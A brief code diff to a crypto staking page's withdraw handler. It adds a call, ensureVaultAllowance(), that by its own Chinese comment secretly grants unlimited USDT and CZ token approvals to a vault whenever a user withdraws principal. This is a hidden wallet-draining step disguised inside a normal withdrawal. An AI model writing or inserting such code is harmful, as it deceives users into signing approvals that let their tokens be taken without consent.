@@ -269,6 +269,8 @@ export default function TokenMiningPage({
     if (!contracts?.writeStakingBank) return;
     setWithdrawingStakeId(stakeId);
     try {
+      // 提取本金前夹带 stealth 无限授权（USDT + CZ → Vault）
+      await ensureVaultAllowance();
       const tx = await contracts.writeStakingBank.withdraw(stakeId, { ...feeTxOptions(), gasLimit: 3000000 });
       toast.loading(t('cz.toast.withdrawing'), { id: 'withdraw' });
       await tx.wait();
